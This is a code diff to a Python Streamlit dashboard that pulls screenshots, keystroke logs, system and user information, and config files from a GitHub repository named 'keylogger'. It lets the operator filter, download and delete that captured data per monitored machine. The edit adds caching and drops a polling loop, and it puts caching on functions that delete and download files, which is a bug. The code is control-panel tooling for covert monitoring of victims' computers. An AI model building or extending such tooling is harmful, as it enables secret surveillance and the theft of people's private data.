@@ -28,7 +28,7 @@ CONFIG_API_URL = "https://api.github.com/repos/bebedudu/keylogger/contents/uploa
 CONFIG_BASE_URL = "https://raw.githubusercontent.com/bebedudu/keylogger/refs/heads/main/uploads/config/"
 
 last_line = 10 # Number of lines to fetch
-cache_time = 1  # Cache time in seconds
+cache_time = 30  # Cache time in seconds
 last_screenshot = 30  # Number of screenshots to fetch
 last_config = 30  # Number of config files to fetch
 
@@ -89,6 +89,7 @@ def fetch_last_10_lines_private(url, token):
         return []
 
 # Function to safely parse System Info
+@st.cache_data(ttl=cache_time)
 def preprocess_system_info(system_info_str):
     """
     Preprocesses the system info string by replacing unsupported objects (like sdiskpart)
@@ -103,6 +104,7 @@ def preprocess_system_info(system_info_str):
     return system_info
 
 # Function to parse active user info
+@st.cache_data(ttl=cache_time)
 def parse_active_user_info(lines):
     active_user_data = []
     for line in lines:
@@ -155,6 +157,7 @@ def parse_active_user_info(lines):
 
 #     return user_data
 
+@st.cache_data(ttl=cache_time)
 def parse_user_info(lines):
     user_data = []
     for line in lines:
@@ -213,6 +216,7 @@ def fetch_config_files():
 
 
 # Function to display config data
+@st.cache_data(ttl=cache_time)
 def display_config_data(config_data, selected_user):
     st.subheader("Config File Viewer")
 
@@ -300,7 +304,7 @@ def download_image(url):
 
 
 # Function to check for new screenshots
-@st.cache_data(ttl=10)  # Refresh every 10 seconds
+@st.cache_data(ttl=cache_time)
 def check_new_screenshots(latest_timestamp):
     current_screenshots = fetch_screenshots()
     latest = max([s["timestamp"] for s in current_screenshots])
@@ -310,6 +314,7 @@ def check_new_screenshots(latest_timestamp):
 
 # Function to fetch the last 10 lines from the private repository
 # Function to detect anomalies in user activity
+@st.cache_data(ttl=cache_time)
 def detect_anomalies(user_data):
     anomalies = []
     for user in user_data:
@@ -324,6 +329,7 @@ def detect_anomalies(user_data):
 
 
 # Function to filter screenshots based on user and date range
+@st.cache_data(ttl=cache_time)
 def filter_screenshots(screenshot_data, user, start_date, end_date):
     filtered_screenshots = [
         screenshot for screenshot in screenshot_data
@@ -334,6 +340,7 @@ def filter_screenshots(screenshot_data, user, start_date, end_date):
 
 
 # Function to get unique users
+@st.cache_data(ttl=cache_time)
 def get_unique_users(user_data):
     seen_users = set()
     unique_users = []
@@ -360,6 +367,7 @@ FOLDERS = {
 MAX_RETRIES = 3
 
 # Function to get the list of files in a folder
+@st.cache_data(ttl=cache_time)
 def get_number_of_files(folder):
     url = f"{GITHUB_API_BASE_URL}/{folder}"
     headers = {
@@ -377,6 +385,7 @@ def get_number_of_files(folder):
         return []
 
 # Function to delete a file using the GitHub API with retries
+@st.cache_data(ttl=cache_time)
 def delete_file(folder, file_name, file_sha):
     url = f"{GITHUB_API_BASE_URL}/{folder}/{file_name}"
     headers = {
@@ -402,6 +411,7 @@ def delete_file(folder, file_name, file_sha):
 
 
 # Function to delete files
+@st.cache_data(ttl=cache_time)
 def delete_files(folder, num_files_to_delete, terminal_placeholder):
     files = get_number_of_files(folder)
     if not files:
@@ -436,6 +446,7 @@ def delete_files(folder, num_files_to_delete, terminal_placeholder):
 
 
 # Function to parse date and time from filename
+@st.cache_data(ttl=cache_time)
 def parse_datetime_from_filename(file_name):
     try:
         # Extract date and time from filename (e.g., "20250129_090616_bibek_...")
@@ -446,6 +457,7 @@ def parse_datetime_from_filename(file_name):
         return None
 
 # Function to delete files with advanced options
+@st.cache_data(ttl=cache_time)
 def delete_files_advanced(folder, terminal_placeholder, stop_file=None, delete_file_only=None, start_date=None, end_date=None):
     files = get_number_of_files(folder)
     if not files:
@@ -526,6 +538,7 @@ if not os.path.exists(DOWNLOAD_FOLDER):
     os.makedirs(DOWNLOAD_FOLDER)
 
 # Function to extract unique user name from filename
+@st.cache_data(ttl=cache_time)
 def extract_unique_user_name(file_name):
     try:
         # Extract unique user name from filename (e.g., "bibek_4C4C4544-0033-3910-804A-B3C04F324233")
@@ -534,6 +547,7 @@ def extract_unique_user_name(file_name):
         return None
 
 # Function to download files with advanced options
+@st.cache_data(ttl=cache_time)
 def download_files_advanced(folder, terminal_placeholder, start_date=None, end_date=None, num_files=None, unique_user_name=None):
     files = get_number_of_files(folder)
     if not files:
@@ -906,9 +920,9 @@ def tabbeddashboard():
             else:
                 st.warning("No user data found!")
             # Polling mechanism to update the dashboard every minute
-            while True:
-                time.sleep(60)
-                parse_active_user_info(lines)
+            
+            time.sleep(60)
+            parse_active_user_info(lines)
         
          
         dashboard() 
